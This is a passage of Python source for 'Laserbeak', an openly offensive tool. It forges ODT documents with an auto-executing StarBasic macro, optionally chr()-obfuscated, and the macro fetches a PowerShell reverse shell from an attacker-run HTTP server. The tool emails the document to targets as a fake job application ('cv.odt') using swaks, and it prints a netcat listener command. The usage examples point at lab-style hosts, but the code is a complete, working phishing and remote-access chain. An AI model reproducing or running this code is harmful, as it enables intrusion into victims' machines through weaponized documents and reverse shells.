# ─── Macro obfuscation ────────────────────────────────────────────────────────
def obfuscate_macro(payload: str) -> str:
    inf("Applying macro obfuscation (chr() encoding)...")
    encoded = ' & '.join([f'Chr({ord(c)})' for c in payload])
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  
Sub AutoOpen()
    Dim s As String
    s = {encoded}
    Shell s
End Sub
</script:module>'''

# ─── ODT structure builders ───────────────────────────────────────────────────
def create_blank_odt(tmp_dir: str, body: str = ""):
    """Extrait le template embarqué — structure ODT complète garantie."""
    import tempfile
    template_bytes = base64.b64decode(DEFAULT_TEMPLATE_B64)
    tmp_zip = tempfile.mktemp(suffix=".odt")
    with open(tmp_zip, "wb") as f:
        f.write(template_bytes)
    with zipfile.ZipFile(tmp_zip, "r") as z:
        z.extractall(tmp_dir)
    os.unlink(tmp_zip)
    # Patch le body si fourni
    if body:
        content_path = f"{tmp_dir}/content.xml"
        with open(content_path, "r") as f:
            content = f.read()
        import re
        content = re.sub(r'<text:p[^/]*/>', f'<text:p>{body}</text:p>', content, count=1)
        with open(content_path, "w") as f:
            f.write(content)


def inject_macro_files(tmp_dir: str, macro_xml: str):
    os.makedirs(f"{tmp_dir}/Basic/Standard", exist_ok=True)

    # Module1.xml (pas .xba)
    with open(f"{tmp_dir}/Basic/Standard/Module1.xml", "w") as f:
        f.write(macro_xml)
    # script-lb.xml dans Basic/Standard/ (pas script-lc)
    with open(f"{tmp_dir}/Basic/Standard/script-lb.xml", "w") as f:
        f.write(SCRIPT_LB)
    # script-lc.xml dans Basic/
    with open(f"{tmp_dir}/Basic/script-lc.xml", "w") as f:
        f.write(SCRIPT_LC)

    # Patch manifest si base ODT importée
    manifest_path = f"{tmp_dir}/META-INF/manifest.xml"
    if os.path.isfile(manifest_path):
        with open(manifest_path, "r") as f:
            manifest = f.read()
        for path in [
            'Basic/Standard/Module1.xml',
            'Basic/Standard/script-lb.xml',
            'Basic/script-lc.xml',
        ]:
            if path not in manifest:
                manifest = manifest.replace(
                    "</manifest:manifest>",
                    f' <manifest:file-entry manifest:media-type="" manifest:full-path="{path}"/>\n</manifest:manifest>'
                )
        with open(manifest_path, "w") as f:
            f.write(manifest)


def pack_odt(tmp_dir: str, output: str):
    """mimetype doit être premier et non compressé — spec ODT obligatoire."""
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as z:
        z.write(os.path.join(tmp_dir, "mimetype"), "mimetype", compress_type=zipfile.ZIP_STORED)
        for root, dirs, files in os.walk(tmp_dir):
            for file in sorted(files):
                fp      = os.path.join(root, file)
                arcname = fp.replace(tmp_dir + "/", "")
                if arcname == "mimetype":
                    continue
                z.write(fp, arcname)

# ─── Loot check ───────────────────────────────────────────────────────────────
def loot_check(output: str):
    v("")
    v("  ── LOOT CHECK ─────────────────────────────────────────")
    with zipfile.ZipFile(output, "r") as z:
        for name in sorted(z.namelist()):
            size = z.getinfo(name).file_size
            ok(f"  {name:<48} ({size} bytes)")

    critical = [
        "mimetype",
        "META-INF/manifest.xml",
        "content.xml",
        "Basic/Standard/Module1.xml",
        "Basic/Standard/script-lb.xml",
        "Basic/script-lc.xml",
    ]

    v("")
    v("  ── STRUCTURE VALIDATION ───────────────────────────────")
    all_ok = True
    with zipfile.ZipFile(output, "r") as z:
        names   = z.namelist()
        content = z.read("content.xml").decode()

        for path in critical:
            if path in names:
                ok(f"  ✓ {path}")
            else:
                err(f"  ✗ MISSING: {path}")
                all_ok = False

        if 'vnd.sun.star.script:Standard.Module1.AutoOpen' in content:
            ok('  ✓ event binding (ooo:script) correct')
        else:
            err('  ✗ event binding not found')
            all_ok = False

    v("")
    if all_ok:
        ok("  Structure valid — document should trigger on open")
    else:
        err("  Structure incomplete — fix before sending")
    v("")

# ─── HTTP Server ──────────────────────────────────────────────────────────────
class SilentHandler(http.server.SimpleHTTPRequestHandler):
    shutdown_trigger = None
    def log_message(self, format, *args):
        inf(f"HTTP  [{self.client_address[0]}] {args[0]} {args[1]}")
        if self.shutdown_trigger and "rev.ps1" in args[0]:
            ok("Payload delivered to the Autobot. Connection established.")
            v("")
            v("   Show no mercy...")
            v("")
            threading.Thread(target=self.shutdown_trigger).start()
    def log_error(self, format, *args):
        warn(f"HTTP ERR [{self.client_address[0]}] {format % args}")


def start_http_server(port: int, directory: str):
    os.chdir(directory)
    httpd = socketserver.TCPServer(("", port), SilentHandler)
    httpd.allow_reuse_address = True
    return httpd

# ─── forge ────────────────────────────────────────────────────────────────────
def forge(args):
    tmp_dir = "/tmp/laserbeak_tmp"
    if os.path.exists(tmp_dir):
        shutil.rmtree(tmp_dir)

    payload = build_payload(args)
    inf(f"Payload  : {payload[:100]}{'...' if len(payload) > 100 else ''}")

    if getattr(args, 'obfuscate', False):
        macro_xml = obfuscate_macro(payload)
    else:
        macro_xml = MACRO_XML.format(payload=payload.replace('"', '&quot;').replace("'", '&apos;'))

    if getattr(args, 'input', None) and os.path.isfile(args.input):
        inf(f"Base ODT : {args.input}")
        with zipfile.ZipFile(args.input, "r") as z:
            z.extractall(tmp_dir)
    else:
        inf("Base ODT : generating blank document")
        create_blank_odt(tmp_dir, getattr(args, 'body', '') or "")

    inject_macro_files(tmp_dir, macro_xml)
    pack_odt(tmp_dir, args.output)
    shutil.rmtree(tmp_dir)

    ok(f"Document forged → {args.output}")
    ok(f"Trigger        → Sub AutoOpen() [ooo:script / vnd.sun.star.script]")

    if getattr(args, 'loot', False):
        loot_check(args.output)

# ─── deliver ──────────────────────────────────────────────────────────────────
def deliver(args):
    if not shutil.which("swaks"):
        err("swaks not found. Install: sudo apt install swaks")
        sys.exit(1)

    attach = getattr(args, 'attach', None) or getattr(args, 'output', None)
    if not all([args.to, args.from_addr, args.server, attach]):
        err("Delivery requires --to, --from, --server, --attach")
        sys.exit(1)

    cmd = [
        "swaks",
        "--to",        args.to,
        "--from",      args.from_addr,
        "--server",    args.server,
        "--port",      str(args.smtp_port),
        "--h-Subject", getattr(args, 'subject', 'Application') or "Application",
        "--body",      getattr(args, 'mail_body', '') or "Please find the attached document.",
        "--attach",    f"@{attach}",
    ]

    inf(f"Transmitting → {args.to} via {args.server}:{args.smtp_port}")
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ok("Message transmitted.")

# ─── chain ────────────────────────────────────────────────────────────────────
def chain(args):
    lport_http = getattr(args, 'lport_http', None) or "8383"
    lport      = getattr(args, 'lport', None)      or "4444"
    ps_file    = getattr(args, 'ps_file', None)    or "rev.ps1"
    serve_dir  = getattr(args, 'serve_dir', None)  or os.getcwd()
    output     = getattr(args, 'output', None)     or "cv.odt"

    # Générer rev.ps1
    ps_path = os.path.join(serve_dir, ps_file)
    with open(ps_path, "w") as f:
        f.write(build_revshell_ps1(args.lhost, lport))
    ok(f"rev.ps1 written → {ps_path}")

    # HTTP server en background
    inf(f"Starting HTTP server on :{lport_http} serving {serve_dir}")
    httpd = start_http_server(int(lport_http), serve_dir)
    SilentHandler.shutdown_trigger = httpd.shutdown

    # Forge ODT
    args.preset     = "iex"
    args.lport_http = lport_http
    args.ps_file    = ps_file
    args.output     = output
    args.lport      = lport
    args.cmd        = None
    args.ps_payload = None
    args.loot       = True
    forge(args)

    # Deliver si SMTP fourni
    if getattr(args, 'to', None) and getattr(args, 'from_addr', None) and getattr(args, 'server', None):
        args.attach = output
        deliver(args)
    else:
        warn("SMTP params not provided — skipping delivery")
        inf(f"Send manually:")
        inf(f"  swaks --to <TO> --from <FROM> --server <IP> --attach @{output}")

    v("")
    v("  ── LISTENER ───────────────────────────────────────────")
    inf(f"  rlwrap nc -lvnp {lport}")
    v("")
    v("   Laserbeak is airborne. Waiting for callback.")
    v("")
    v("             Till all are one")
    v("")

    try:
        inf("HTTP server running — waiting for payload fetch...")
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.shutdown()
        ok("Laserbeak recalled.")

# ─── CLI ──────────────────────────────────────────────────────────────────────
def main():
    banner()

    parser = argparse.ArgumentParser(
        prog="laserbeak.py",
        description="Laserbeak — Decepticon ODT Macro Injector",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{VIOLET}── FORGE ──────────────────────────────────────────────────────────────{NC}
  python3 laserbeak.py forge --preset whoami -o test.odt --loot
  python3 laserbeak.py forge --preset iex --lhost 10.10.14.10 -o cv.odt
  python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 -o cv.odt
  python3 laserbeak.py forge --cmd "cmd /c calc.exe" -o test.odt --loot
  python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 --obfuscate -o evil.odt

{VIOLET}── DELIVER ────────────────────────────────────────────────────────────{NC}
  python3 laserbeak.py deliver --to victim@target.htb --from hr@target.htb \\
    --server 10.10.11.X --attach cv.odt

{VIOLET}── FULL CHAIN ─────────────────────────────────────────────────────────{NC}
  python3 laserbeak.py chain \\
    --lhost 10.10.14.10 --lport 4444 --lport-http 8383 \\
    --to career@job.local --from hr@job.local --server 10.129.X.X -o cv.odt

  python3 laserbeak.py chain --lhost 10.10.14.10 --lport 4444 -o cv.odt
"""
    )

    sub = parser.add_subparsers(dest="command")

    # ── forge ──
    fp = sub.add_parser("forge", help="Build malicious ODT document")
    fp.add_argument("-i", "--input",      help="Base ODT template")
    fp.add_argument("-o", "--output",     default="malicious.odt")
    fp.add_argument("--body",             help="Decoy text content")
    fp.add_argument("--obfuscate",        action="store_true")
    fp.add_argument("--loot",             action="store_true")
    fp.add_argument("--lhost")
    fp.add_argument("--lport",            default="4444")
    fp.add_argument("--lport-http",       dest="lport_http", default="8383")
    fp.add_argument("--ps-file",          dest="ps_file", default="rev.ps1")
    pg = fp.add_mutually_exclusive_group()
    pg.add_argument("-p", "--ps-payload", dest="ps_payload")
    pg.add_argument("--cmd")
    pg.add_argument("--preset",           help=f"Preset: {', '.join(PRESETS.keys())}")

    # ── deliver ──
    dp = sub.add_parser("deliver", help="Send ODT via SMTP (swaks)")
    dp.add_argument("--to",        required=True, dest="to")
    dp.add_argument("--from",      required=True, dest="from_addr")
    dp.add_argument("--server",    required=True)
    dp.add_argument("--port",      dest="smtp_port", default=25, type=int)
    dp.add_argument("--attach",    required=True)
    dp.add_argument("--subject",   default="Application")
    dp.add_argument("--mail-body", dest="mail_body", default="Please find the attached document.")

    # ── chain ──
    cp = sub.add_parser("chain", help="Full chain: forge + http.server + optional deliver")
    cp.add_argument("--lhost",       required=True)
    cp.add_argument("--lport",       default="4444")
    cp.add_argument("--lport-http",  dest="lport_http", default="8383")
    cp.add_argument("--ps-file",     dest="ps_file", default="rev.ps1")
    cp.add_argument("--serve-dir",   dest="serve_dir", default=None)
    cp.add_argument("-o", "--output", default="cv.odt")
    cp.add_argument("-i", "--input")
    cp.add_argument("--body")
    cp.add_argument("--obfuscate",   action="store_true")
    cp.add_argument("--to",          dest="to",        default=None)
    cp.add_argument("--from",        dest="from_addr", default=None)
    cp.add_argument("--server",      default=None)
    cp.add_argument("--port",        dest="smtp_port", default=25, type=int)
    cp.add_argument("--subject",     default="Application")
    cp.add_argument("--mail-body",   dest="mail_body", default="Please find the attached document.")

    args = parser.parse_args()

    if args.command == "forge":
        forge(args)
        v("")
        v("   Laserbeak is airborne. The document is ready.")
        v("   Till all are one.")
        v("")
    elif args.command == "deliver":
        deliver(args)
        v("")
        v("   Laserbeak returns to Soundwave. Mission complete.")
        v("   Till all are one.")
        v("")
    elif args.command == "chain":
        chain(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
